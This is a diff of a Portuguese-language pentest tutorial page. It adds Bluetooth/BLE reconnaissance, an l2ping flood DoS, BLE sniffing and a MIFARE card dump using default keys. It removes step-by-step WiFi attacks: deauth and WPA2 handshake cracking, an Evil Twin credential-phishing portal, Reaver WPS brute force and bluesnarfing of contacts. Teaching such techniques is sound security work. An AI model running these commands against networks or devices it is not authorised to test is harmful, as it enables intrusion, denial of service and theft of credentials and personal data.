@@ -1,399 +1,375 @@
 import { PageContainer } from "@/components/layout/PageContainer";
-import { CodeBlock } from "@/components/ui/CodeBlock";
 import { AlertBox } from "@/components/ui/AlertBox";
+import { CommandTable } from "@/components/ui/CommandTable";
+import { OutputBlock } from "@/components/ui/OutputBlock";
+import { PracticeBox } from "@/components/ui/PracticeBox";
+import { Terminal } from "@/components/ui/Terminal";
 
 export default function WirelessBluetooth() {
   return (
     <PageContainer
-      title="Wireless & Bluetooth — Pentest de Redes Sem Fio"
-      subtitle="Ataques a redes WiFi e Bluetooth. Inclui captura de handshakes, cracking WPA2, Evil Twin, deauth attacks, Bluetooth scanning/exploitation, e ferramentas como Aircrack-ng, Bettercap e Reaver."
-      difficulty="avancado"
-      timeToRead="30 min"
+      title="Wireless: Bluetooth + outras tecnologias"
+      subtitle="bluetoothctl, hcitool, l2ping, BLE, RFID/NFC, SDR (RTL-SDR), Zigbee."
+      difficulty="intermediário"
+      timeToRead="14 min"
+      prompt="wireless/bluetooth"
     >
-      <h2>WiFi Pentest — Fundamentos</h2>
-      <p>
-        Pentest de WiFi envolve testar a segurança de redes sem fio: força da criptografia (WPA2/WPA3),
-        resistência a ataques de desautenticação, detecção de rogue APs, e teste de senhas fracas.
-        Requer um <strong>adaptador WiFi com suporte a modo monitor e injeção de pacotes</strong>.
-      </p>
+      <h2>Bluetooth Classic — bluez stack</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo apt install -y bluez bluez-tools bluez-hcidump bluez-deprecated",
+            out: "(stack oficial Linux)",
+            outType: "muted",
+          },
+          {
+            cmd: "hciconfig",
+            out: `hci0:	Type: Primary  Bus: USB
+	BD Address: 5C:F3:70:8A:21:42  ACL MTU: 1021:8  SCO MTU: 64:1
+	UP RUNNING 
+	RX bytes:1842 acl:0 sco:0 events:78 errors:0
+	TX bytes:1241 acl:0 sco:0 commands:54 errors:0`,
+            outType: "info",
+          },
+          {
+            comment: "ligar adaptador",
+            cmd: "sudo hciconfig hci0 up && sudo hciconfig hci0 piscan",
+            out: "(silencioso)",
+            outType: "muted",
+          },
+        ]}
+      />
 
-      <AlertBox type="warning" title="Hardware necessário">
-        A placa WiFi interna do notebook geralmente NÃO suporta modo monitor. É necessário um
-        adaptador USB WiFi compatível. Modelos recomendados: Alfa AWUS036ACH (AC, 2.4/5GHz),
-        Alfa AWUS036NHA (N, 2.4GHz), ou TP-Link TL-WN722N v1 (chipset Atheros AR9271).
+      <h2>Descoberta — hcitool / bluetoothctl</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo hcitool scan",
+            out: `Scanning ...
+        AC:67:5D:11:42:F8       JBL Flip 6
+        F8:30:02:8A:21:11       Wallyson's iPhone
+        D4:90:9C:42:88:7E       MX Master 3
+        20:34:FB:89:42:01       BT Speaker
+        FC:4C:E5:11:22:33       SmartBand_X3`,
+            outType: "info",
+          },
+          {
+            comment: "info detalhado de um dispositivo",
+            cmd: "sudo hcitool info AC:67:5D:11:42:F8",
+            out: `Requesting information ...
+        BD Address:  AC:67:5D:11:42:F8
+        Device Name: JBL Flip 6
+        LMP Version: 5.2 (0xb)  LMP Subversion: 0x100c
+        Manufacturer: Qualcomm Technologies International, Ltd. (Q.T.I.L) (29)
+        Features page 0: 0xff 0xff 0x8d 0xfe 0xdb 0xff 0x7b 0x87
+        Features page 1: 0x07 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+        Features page 2: 0x09 0x00 0x00 0x00 0x00 0x00 0x00 0x00`,
+            outType: "default",
+          },
+          {
+            cmd: "sdptool browse AC:67:5D:11:42:F8",
+            out: `Browsing AC:67:5D:11:42:F8 ...
+Service Name: Hands-Free Gateway
+Service RecHandle: 0x10000
+Service Class ID List:
+  "Handsfree Gateway" (0x111f)
+  "Generic Audio" (0x1203)
+Protocol Descriptor List:
+  "L2CAP" (0x0100)
+  "RFCOMM" (0x0003)
+    Channel: 1`,
+            outType: "info",
+          },
+        ]}
+      />
+
+      <h2>bluetoothctl — interativo moderno</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "bluetoothctl",
+            out: `Agent registered
+[bluetooth]#`,
+            outType: "muted",
+          },
+        ]}
+      />
+      <Terminal
+        user=""
+        host="bluetooth"
+        path=""
+        prompt="]#"
+        lines={[
+          {
+            cmd: "scan on",
+            out: `Discovery started
+[CHG] Controller 5C:F3:70:8A:21:42 Discovering: yes
+[NEW] Device AC:67:5D:11:42:F8 JBL Flip 6
+[NEW] Device F8:30:02:8A:21:11 Wallyson's iPhone
+[NEW] Device D4:90:9C:42:88:7E MX Master 3`,
+            outType: "info",
+          },
+          {
+            cmd: "devices",
+            out: `Device AC:67:5D:11:42:F8 JBL Flip 6
+Device F8:30:02:8A:21:11 Wallyson's iPhone
+Device D4:90:9C:42:88:7E MX Master 3`,
+            outType: "default",
+          },
+          {
+            cmd: "info AC:67:5D:11:42:F8",
+            out: `Device AC:67:5D:11:42:F8 (public)
+        Name: JBL Flip 6
+        Alias: JBL Flip 6
+        Class: 0x002c0414 (2884116)
+        Icon: audio-card
+        Paired: no
+        Bonded: no
+        Trusted: no
+        Blocked: no
+        Connected: no
+        UUID: Headset                   (00001108-0000-1000-8000-00805f9b34fb)
+        UUID: Audio Sink                (0000110b-0000-1000-8000-00805f9b34fb)
+        UUID: Hands-Free                (0000111e-0000-1000-8000-00805f9b34fb)`,
+            outType: "info",
+          },
+          {
+            cmd: "pair AC:67:5D:11:42:F8",
+            out: `Attempting to pair with AC:67:5D:11:42:F8
+[CHG] Device AC:67:5D:11:42:F8 Connected: yes
+Request confirmation
+[agent] Confirm passkey 482917 (yes/no): yes
+[CHG] Device AC:67:5D:11:42:F8 Paired: yes
+Pairing successful`,
+            outType: "success",
+          },
+        ]}
+      />
+
+      <h2>Ataque — l2ping (DoS clássico)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "ping em camada L2CAP — flood pode derrubar dispositivos antigos",
+            cmd: "sudo l2ping -i hci0 -s 600 -f AC:67:5D:11:42:F8",
+            out: `Ping: AC:67:5D:11:42:F8 from 5C:F3:70:8A:21:42 (data size 600) ...
+600 bytes from AC:67:5D:11:42:F8 id 0 time 8.42ms
+600 bytes from AC:67:5D:11:42:F8 id 1 time 12.18ms
+600 bytes from AC:67:5D:11:42:F8 id 2 time 9.82ms
+[...]
+^C
+1421 sent, 1338 received, 5% loss`,
+            outType: "warning",
+          },
+        ]}
+      />
+
+      <h2>Bluetooth Low Energy (BLE)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo hcitool lescan",
+            out: `LE Scan ...
+F0:50:8B:11:42:F8 (unknown)
+F0:50:8B:11:42:F8 SmartBand_X3
+4C:65:A8:42:88:11 (unknown)
+4C:65:A8:42:88:11 Beacon-IoT-Sensor
+B8:27:EB:42:11:99 (unknown)
+B8:27:EB:42:11:99 RaspberryPi-Zero-W`,
+            outType: "info",
+          },
+          {
+            cmd: "sudo gatttool -b F0:50:8B:11:42:F8 --interactive",
+            out: `[F0:50:8B:11:42:F8][LE]> connect
+Attempting to connect to F0:50:8B:11:42:F8
+Connection successful`,
+            outType: "success",
+          },
+        ]}
+      />
+      <Terminal
+        user=""
+        host="LE"
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "primary",
+            out: `attr handle: 0x0001, end grp handle: 0x0007 uuid: 00001800-0000-1000-8000-00805f9b34fb (Generic Access)
+attr handle: 0x0008, end grp handle: 0x000c uuid: 00001801-0000-1000-8000-00805f9b34fb (Generic Attribute)
+attr handle: 0x000d, end grp handle: 0x002a uuid: 0000180f-0000-1000-8000-00805f9b34fb (Battery Service)
+attr handle: 0x002b, end grp handle: 0xffff uuid: 0000180a-0000-1000-8000-00805f9b34fb (Device Information)`,
+            outType: "info",
+          },
+          {
+            cmd: "char-read-uuid 0x2a19",
+            out: "handle: 0x000f   value: 4a    ← bateria 74%",
+            outType: "default",
+          },
+          {
+            cmd: "char-read-uuid 0x2a29",
+            out: `handle: 0x002d   value: 58 69 61 6f 6d 69 20 49 6e 63    ← "Xiaomi Inc"`,
+            outType: "default",
+          },
+        ]}
+      />
+
+      <h2>btlejack / Wireshark BLE</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            comment: "captura BLE com adaptador especial (BBC micro:bit)",
+            cmd: "sudo btlejack -s",
+            out: `[i] Detected sniffer:
+ > BBC micro:bit (Adafruit) (firmware version 5)
+[i] Listing connections in advertising state...
+
+[+] Detected connection 0x4f8a21:
+    Master MAC:    08:00:27:de:ad:be (random)
+    Slave MAC:     F0:50:8B:11:42:F8 (public)
+    AA:            0xaf9b8c42`,
+            outType: "info",
+          },
+          {
+            cmd: "sudo btlejack -f 0xaf9b8c42 -x output.pcap",
+            out: `[i] Capturing connection 0xaf9b8c42 to output.pcap`,
+            outType: "warning",
+          },
+        ]}
+      />
+
+      <h2>RFID/NFC — Proxmark3 e libnfc</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo apt install -y libnfc-bin libnfc-examples",
+            out: "(precisa de leitor compatível: ACR122U, PN532)",
+            outType: "muted",
+          },
+          {
+            cmd: "nfc-list",
+            out: `nfc-list uses libnfc 1.8.0
+NFC device: ACS / ACR122U PICC Interface opened
+
+1 ISO14443A passive target(s) found:
+ISO/IEC 14443A (106 kbps) target:
+    ATQA (SENS_RES): 00  04
+       UID (NFCID1): 4a  82  6f  c1
+      SAK (SEL_RES): 08`,
+            outType: "info",
+          },
+          {
+            cmd: "sudo nfc-mfclassic R u 0 dump.mfd default-keys.txt",
+            out: `Sector: 0, type A, probed key: ffffffffffff
+Sector: 1, type A, probed key: ffffffffffff
+[...]
+Sector: 15, type B, probed key: ffffffffffff
+Reading sector |################################| 1024 bytes
+Done, 1024 bytes saved.`,
+            outType: "success",
+          },
+          {
+            cmd: "xxd dump.mfd | head -5",
+            out: `00000000: 4a82 6fc1 9b08 0400 c2bb 9bd5 1003 7700  J.o...........w.
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: ffff ffff ffff ff07 8069 ffff ffff ffff  .........i......
+00000040: 4d49 4e c4 0001 0001 0000 0000 0000 0000  MIN.............`,
+            outType: "default",
+          },
+        ]}
+      />
+
+      <h2>SDR — RTL-SDR (radio definida por software)</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo apt install -y rtl-sdr gqrx-sdr gnuradio gr-osmosdr",
+            out: "(stack para receber 24 MHz a 1.7 GHz)",
+            outType: "muted",
+          },
+          {
+            cmd: "rtl_test",
+            out: `Found 1 device(s):
+  0:  Realtek, RTL2838UHIDIR, SN: 00000001
+
+Using device 0: Generic RTL2832U OEM
+Found Rafael Micro R820T tuner
+Supported gain values (29): 0.0 0.9 1.4 2.7 3.7 7.7 8.7 12.5 ...
+[R82XX] PLL not locked!
+Sampling at 2048000 S/s.
+
+Info: This tool will continuously read from the device, and report if`,
+            outType: "info",
+          },
+          {
+            comment: "captura FM em 89.1 MHz (decodifica)",
+            cmd: "rtl_fm -f 89.1M -M wbfm -s 200000 -r 48000 - | aplay -r 48000 -f S16_LE",
+            out: "(rádio FM tocando — confirma que SDR funciona)",
+            outType: "default",
+          },
+          {
+            comment: "GQRX — interface visual (waterfall)",
+            cmd: "gqrx &",
+            out: "(GUI: tunável de 24M a 1.7G, vê telecomunicações, ADS-B avião, controle remoto)",
+            outType: "muted",
+          },
+        ]}
+      />
+
+      <h2>Zigbee / Z-Wave / LoRa</h2>
+      <CommandTable
+        title="Stack para IoT moderno"
+        variations={[
+          { cmd: "Killerbee", desc: "Suíte Zigbee — sniffing + injection.", output: "Precisa Atmel RZUSBStick." },
+          { cmd: "scapy-radio", desc: "Scapy + GNU Radio para 802.15.4.", output: "Para Zigbee custom packet crafting." },
+          { cmd: "Z-Stick (UZB7)", desc: "Adaptador Z-Wave para Linux.", output: "Sniffing com OpenZWave." },
+          { cmd: "LoRa (HackRF / RFM95)", desc: "868/915 MHz LoRa packet sniff.", output: "Para attaques contra agro-IoT." },
+        ]}
+      />
+
+      <PracticeBox
+        title="BLE recon — descubra dispositivos por perto"
+        goal="Listar dispositivos BLE ao alcance, identificar fabricante e ler informações públicas (bateria, temperatura)."
+        steps={[
+          "Habilite o adaptador Bluetooth.",
+          "Faça LE scan.",
+          "Para um dispositivo aberto (sem pareamento), liste services com gatttool.",
+          "Leia características conhecidas (bateria 0x2a19, modelo 0x2a24, fabricante 0x2a29).",
+        ]}
+        command={`sudo hciconfig hci0 up
+sudo hcitool lescan --duplicates &
+sleep 10
+sudo kill %1
+
+# Conecte em UM dispositivo descoberto (substitua MAC)
+TARGET=F0:50:8B:11:42:F8
+sudo gatttool -b $TARGET --primary
+sudo gatttool -b $TARGET --char-read --uuid 0x2a19   # battery
+sudo gatttool -b $TARGET --char-read --uuid 0x2a29   # manufacturer`}
+        expected={`(scan)
+F0:50:8B:11:42:F8 SmartBand_X3
+4C:65:A8:42:88:11 Beacon-IoT-Sensor
+
+(read)
+handle: 0x000f   value: 4a       (74% battery)
+handle: 0x002d   value: 58 69 61 6f 6d 69 20 49 6e 63   ("Xiaomi Inc")`}
+        verify="Você só conseguirá ler chars públicas (sem pairing). Para chars protegidas precisa de bonding (com PIN)."
+      />
+
+      <AlertBox type="warning" title="BLE moderno: Secure Connections + chars privadas">
+        BLE 4.2+ usa Secure Connections (ECDH) — passive sniff não revela payload.
+        Mas muitos dispositivos baratos ainda usam Just Works pairing (sem MITM protection)
+        e expõem chars críticas sem auth — vetor de IoT pentest.
       </AlertBox>
-
-      <h2>Configuração do Adaptador WiFi</h2>
-      <CodeBlock
-        title="Habilitar modo monitor e verificar injeção"
-        code={`# ═══════════════════════════════════════════════════
-# IDENTIFICAR ADAPTADOR
-# ═══════════════════════════════════════════════════
-iwconfig
-# Lo no output:
-# wlan0     IEEE 802.11  Mode:Managed  ...
-# wlan1     IEEE 802.11  Mode:Managed  ...
-# ↑ wlan0 = interno (provavelmente)
-# ↑ wlan1 = adaptador USB (se plugado)
-
-# Verificar driver e chipset:
-airmon-ng
-# PHY     Interface  Driver      Chipset
-# phy0    wlan0      iwlwifi     Intel ...       ← interno
-# phy1    wlan1      ath9k_htc   Atheros AR9271  ← USB! ✓
-
-# ═══════════════════════════════════════════════════
-# HABILITAR MODO MONITOR
-# ═══════════════════════════════════════════════════
-
-# PASSO 1: Matar processos que interferem
-sudo airmon-ng check kill
-# Mata: NetworkManager, wpa_supplicant, dhclient
-# Esses processos tentam conectar a redes e atrapalham
-# a captura de pacotes
-
-# PASSO 2: Iniciar modo monitor
-sudo airmon-ng start wlan1
-# Output:
-# (monitor mode enabled on wlan1mon)
-# ↑ Interface muda para wlan1mon
-
-# Verificar:
-iwconfig wlan1mon
-# Mode:Monitor  ← Confirmado!
-
-# PASSO 3: Testar injeção de pacotes
-sudo aireplay-ng --test wlan1mon
-# Injection is working!  ← OK!
-# Se falhar → adaptador não suporta injeção
-
-# ═══════════════════════════════════════════════════
-# MUDAR CANAL MANUALMENTE
-# ═══════════════════════════════════════════════════
-sudo iwconfig wlan1mon channel 6
-# Fixa no canal 6 (necessário para ataques direcionados)
-
-# ═══════════════════════════════════════════════════
-# DESABILITAR MODO MONITOR (após terminar)
-# ═══════════════════════════════════════════════════
-sudo airmon-ng stop wlan1mon
-sudo systemctl start NetworkManager
-# Restaura modo normal e reconecta à rede`}
-      />
-
-      <h2>Aircrack-ng Suite — Captura e Cracking WPA2</h2>
-      <CodeBlock
-        title="Capturar handshake e crackear senha WPA2"
-        code={`# ═══════════════════════════════════════════════════
-# PASSO 1: ESCANEAR REDES DISPONÍVEIS
-# ═══════════════════════════════════════════════════
-sudo airodump-ng wlan1mon
-# Output em tempo real:
-#
-# BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
-# AA:BB:CC:DD:EE:FF  -45  150      85     6   54e  WPA2 CCMP    PSK   EMPRESA_WIFI
-# 11:22:33:44:55:66  -72  80       12     1   54e  WPA2 CCMP    PSK   VIZINHO
-#
-# Colunas explicadas:
-# BSSID   = MAC do Access Point
-# PWR     = Potência do sinal (dBm). -45 = forte, -80 = fraco
-# Beacons = Pacotes beacon recebidos (mais = mais visível)
-# #Data   = Pacotes de dados capturados
-# CH      = Canal da rede (1-13 em 2.4GHz, 36-165 em 5GHz)
-# MB      = Velocidade máxima (54e = 802.11n)
-# ENC     = Criptografia (WPA2, WPA, WEP, OPN = aberta)
-# CIPHER  = Cifra (CCMP = AES, TKIP = mais fraco)
-# AUTH    = Autenticação (PSK = senha, MGT = RADIUS/Enterprise)
-# ESSID   = Nome da rede
-#
-# Parte inferior mostra CLIENTES conectados:
-# BSSID              STATION            PWR  Rate  Lost  Frames
-# AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -35  54e   0     482
-# ↑ AP                ↑ Cliente conectado ao AP
-
-# ═══════════════════════════════════════════════════
-# PASSO 2: FOCAR NA REDE ALVO
-# ═══════════════════════════════════════════════════
-sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan1mon
-# -c 6             = fixar no canal 6 (canal do alvo)
-# --bssid AA:BB:.. = focar apenas nesse AP
-# -w captura       = salvar captura em arquivo "captura-01.cap"
-# Manter rodando! Precisamos capturar o 4-way handshake.
-
-# ═══════════════════════════════════════════════════
-# PASSO 3: FORÇAR HANDSHAKE (deauth attack)
-# ═══════════════════════════════════════════════════
-# Em OUTRO terminal (manter airodump rodando!):
-sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan1mon
-# -0 5              = enviar 5 pacotes de deautenticação
-#   Tipo 0 = deauthentication frame
-#   5 pacotes = geralmente suficiente para desconectar o cliente
-# -a AA:BB:..       = BSSID do AP (access point)
-# -c FF:EE:..       = MAC do cliente a desconectar
-#   Se omitir -c → desautentica TODOS os clientes (broadcast)
-#
-# O que acontece:
-# 1. Enviamos frames de deauth spoofados como se fossem do AP
-# 2. Cliente recebe e desconecta
-# 3. Cliente reconecta AUTOMATICAMENTE
-# 4. Na reconexão, o 4-way handshake ocorre
-# 5. airodump-ng captura o handshake!
-#
-# Quando capturado, airodump mostra no canto superior direito:
-# [ WPA handshake: AA:BB:CC:DD:EE:FF ]  ← SUCESSO!
-
-# ═══════════════════════════════════════════════════
-# PASSO 4: CRACKEAR A SENHA
-# ═══════════════════════════════════════════════════
-sudo aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt
-# captura-01.cap  = arquivo com o handshake capturado
-# -w rockyou.txt  = wordlist de senhas (14 milhões de senhas)
-#
-# Output durante o cracking:
-# Aircrack-ng 1.7
-# [00:01:23] 123456/14344392 keys tested (1234.56 k/s)
-# Current passphrase: Empresa2024!
-#
-#     KEY FOUND! [ Empresa2024! ]
-#
-# Master Key     : AB CD EF 12 34 56 78 90 ...
-# Transient Key  : 00 11 22 33 44 55 66 77 ...
-# EAPOL HMAC     : AA BB CC DD EE FF 00 11 ...
-#
-# → Senha encontrada: Empresa2024!
-
-# ═══════════════════════════════════════════════════
-# CRACKING COM GPU (muito mais rápido!)
-# ═══════════════════════════════════════════════════
-# Converter para formato hashcat:
-# Ferramenta online: https://hashcat.net/cap2hashcat/
-# Ou:
-hcxpcapngtool -o hash.hc22000 captura-01.cap
-# Converte .cap → formato hashcat 22000
-
-# Crackear com hashcat (GPU):
-hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
-# -m 22000 = WPA-PBKDF2-PMKID+EAPOL
-# GPU: milhões de hashes/segundo vs milhares com CPU!
-
-# Com regras (variações de senhas):
-hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
-# -r = regras de mutação (adiciona números, símbolos, capitaliza, etc.)`}
-      />
-
-      <h2>Evil Twin Attack</h2>
-      <CodeBlock
-        title="Criar AP falso para capturar credenciais"
-        code={`# ═══════════════════════════════════════════════════
-# CONCEITO DO EVIL TWIN
-# ═══════════════════════════════════════════════════
-# 1. Criar AP falso com MESMO nome (ESSID) da rede alvo
-# 2. Desautenticar clientes do AP legítimo
-# 3. Clientes reconectam no AP falso (sinal mais forte)
-# 4. Apresentar portal captive pedindo a senha WiFi
-# 5. Cliente digita a senha → capturada!
-# 6. Testar a senha capturada no AP legítimo
-
-# ═══════════════════════════════════════════════════
-# USANDO WIFIPHISHER (automatiza tudo)
-# ═══════════════════════════════════════════════════
-sudo apt install wifiphisher
-
-sudo wifiphisher -aI wlan1mon -eI wlan0 -p firmware-upgrade
-# -aI wlan1mon  = interface para o AP falso (modo monitor)
-# -eI wlan0     = interface para internet (compartilhar conexão)
-# -p firmware-upgrade = scenario:
-#   Mostra página "Firmware upgrade required"
-#   Pede a senha WiFi para "completar a atualização"
-#
-# Scenarios disponíveis:
-# firmware-upgrade    — atualização de firmware (pede senha WiFi)
-# oauth-login         — login com redes sociais
-# plugin-update       — atualização de plugin do browser
-# network-manager-connect — simula reconexão do NetworkManager
-
-# Wifiphisher automaticamente:
-# 1. Escaneia redes → você escolhe o alvo
-# 2. Cria AP clone com mesmo ESSID e BSSID
-# 3. Envia deauth para desconectar clientes
-# 4. Clientes conectam no clone
-# 5. Portal captive captura a senha
-# 6. Mostra a senha capturada no terminal!`}
-      />
-
-      <h2>WPS Attack com Reaver</h2>
-      <CodeBlock
-        title="Explorar WPS (Wi-Fi Protected Setup) habilitado"
-        code={`# ═══════════════════════════════════════════════════
-# O QUE É WPS
-# ═══════════════════════════════════════════════════
-# WPS permite conectar pressionando um botão ou digitando
-# um PIN de 8 dígitos. O PIN tem apenas 11.000 combinações
-# possíveis (não 10^8!) por causa de um design flaw:
-# - Os 8 dígitos são verificados em DUAS METADES de 4
-# - Primeira metade: 10^4 = 10.000 combinações
-# - Segunda metade: 10^3 = 1.000 combinações (último é checksum)
-# - Total: ~11.000 tentativas = ~4-10 horas!
-
-# ═══════════════════════════════════════════════════
-# VERIFICAR SE WPS ESTÁ HABILITADO
-# ═══════════════════════════════════════════════════
-sudo wash -i wlan1mon
-# Output:
-# BSSID              Ch  WPS  Lock  Vendor    ESSID
-# AA:BB:CC:DD:EE:FF   6  2.0  No    RealTek   EMPRESA_WIFI
-#                         ↑    ↑
-#                    WPS ativo  Não bloqueado → VULNERÁVEL!
-
-# ═══════════════════════════════════════════════════
-# ATAQUE COM REAVER
-# ═══════════════════════════════════════════════════
-sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
-# -i wlan1mon     = interface em modo monitor
-# -b AA:BB:..     = BSSID do AP alvo
-# -c 6            = canal da rede
-# -vv             = very verbose (mostra cada tentativa)
-#
-# Output:
-# [+] Trying pin "12345670"
-# [+] Trying pin "12345671"
-# ...
-# [+] WPS PIN: '23456789'
-# [+] WPA PSK: 'SenhaDoWiFi123!'
-# → Descobriu o PIN E a senha WPA!
-
-# Flags adicionais:
-# -d 1   = delay de 1 segundo entre tentativas (evita lockout)
-# -t 3   = timeout de 3 segundos para respostas
-# -N     = não enviar NACK (mais rápido em alguns APs)
-# -S     = usar fragmentação de pacotes pequenos
-# -K 1   = Pixie Dust attack (MUITO mais rápido se AP vulnerável!)
-
-# ═══════════════════════════════════════════════════
-# PIXIE DUST ATTACK (segundos em vez de horas!)
-# ═══════════════════════════════════════════════════
-# Se o AP usa números aleatórios fracos na geração do PIN:
-sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1
-# -K 1 = Pixie Dust mode
-# Captura APENAS a primeira troca e calcula o PIN offline!
-# Tempo: segundos a minutos (vs horas no brute force)
-
-# Alternativa com bully:
-sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
-# Outra ferramenta para WPS, às vezes funciona quando Reaver não`}
-      />
-
-      <h2>Bluetooth Hacking</h2>
-      <CodeBlock
-        title="Scanning, enumeração e exploração Bluetooth"
-        code={`# ═══════════════════════════════════════════════════
-# FERRAMENTAS BLUETOOTH
-# ═══════════════════════════════════════════════════
-sudo apt install bluetooth bluez bluez-tools btscanner
-
-# Verificar adaptador Bluetooth:
-hciconfig
-# hci0: Type: Primary  Bus: USB
-#       BD Address: AA:BB:CC:DD:EE:FF  ACL MTU: 1021
-#       UP RUNNING
-
-# Se DOWN:
-sudo hciconfig hci0 up
-
-# ═══════════════════════════════════════════════════
-# SCANNING — DESCOBRIR DISPOSITIVOS
-# ═══════════════════════════════════════════════════
-
-# Scan clássico (Bluetooth BR/EDR):
-sudo hcitool scan
-# Scanning...
-#   11:22:33:44:55:66  "iPhone de João"
-#   AA:BB:CC:DD:EE:FF  "Samsung Galaxy S23"
-#   FF:EE:DD:CC:BB:AA  "Fone Bluetooth"
-# ↑ MAC e nome do dispositivo
-
-# Scan BLE (Bluetooth Low Energy):
-sudo hcitool lescan
-# LE Scan...
-# 11:22:33:44:55:66 Smart Lock XYZ
-# AA:BB:CC:DD:EE:FF Fitness Band ABC
-# BLE é usado em: smartwatches, fechaduras, sensores IoT
-
-# Scan com informações detalhadas:
-sudo btscanner
-# Interface gráfica TUI que mostra:
-# - Nome, MAC, classe do dispositivo
-# - Serviços disponíveis (SDP)
-# - Fabricante
-# - Features suportadas
-
-# ═══════════════════════════════════════════════════
-# ENUMERAÇÃO DE SERVIÇOS (SDP)
-# ═══════════════════════════════════════════════════
-# SDP (Service Discovery Protocol) lista serviços do dispositivo:
-sdptool browse 11:22:33:44:55:66
-# Output:
-# Service Name: OBEX Object Push
-# Channel: 12
-# Profile: OBEX Object Push (0x1105)
-#
-# Service Name: Headset Audio Gateway
-# Channel: 3
-# Profile: Headset (0x1108)
-#
-# Serviços interessantes para ataque:
-# OBEX Object Push → pode enviar/receber arquivos!
-# Serial Port → comunicação serial (pode ser explorada)
-# BNEP → Bluetooth Network (pode acessar rede)
-
-# ═══════════════════════════════════════════════════
-# ATAQUES BLUETOOTH
-# ═══════════════════════════════════════════════════
-
-# ─── BLUEPRINTING ─────────────────────────────────
-# Identificar dispositivo sem parear:
-sudo l2ping 11:22:33:44:55:66 -c 5
-# Ping L2CAP — verifica se dispositivo responde
-# -c 5 = 5 pings
-
-# ─── BLUESNARFING (roubar dados) ──────────────────
-# Explorar OBEX para baixar contatos, SMS, etc.:
-obexftp -b 11:22:33:44:55:66 -c 12 -l
-# -b = MAC do alvo
-# -c 12 = canal OBEX (encontrado via SDP)
-# -l = listar diretório
-
-obexftp -b 11:22:33:44:55:66 -c 12 -g telecom/pb.vcf
-# -g = GET (baixar arquivo)
-# telecom/pb.vcf = agenda de contatos em formato vCard!
-
-# ─── BLUEJACKING (enviar mensagens) ──────────────
-# Enviar mensagem/contato não solicitado:
-obexftp -b 11:22:33:44:55:66 -c 12 -p mensagem.txt
-# -p = PUT (enviar arquivo)
-# Antigamente usado para spam, hoje menos eficaz
-
-# ═══════════════════════════════════════════════════
-# BETTERCAP — BLUETOOTH + WIFI
-# ═══════════════════════════════════════════════════
-sudo bettercap
-
-# Dentro do Bettercap:
-> ble.recon on                # Iniciar scan BLE
-> ble.show                    # Mostrar dispositivos encontrados
-> ble.enum MAC_ADDRESS        # Enumerar serviços/características
-# Mostra serviços GATT, handles, e valores
-# Pode ler/escrever características BLE
-> ble.write MAC HANDLE VALUE  # Escrever valor em característica
-# Útil para explorar dispositivos IoT: trancar/destrancar fechaduras,
-# mudar configurações de sensores, etc.
-
-# WiFi com Bettercap:
-> wifi.recon on               # Scan WiFi
-> wifi.show                   # Listar redes e clientes
-> wifi.deauth AP_BSSID        # Deauth attack
-> wifi.assoc AP_BSSID         # Association attack (PMKID)`}
-      />
     </PageContainer>
   );
 }
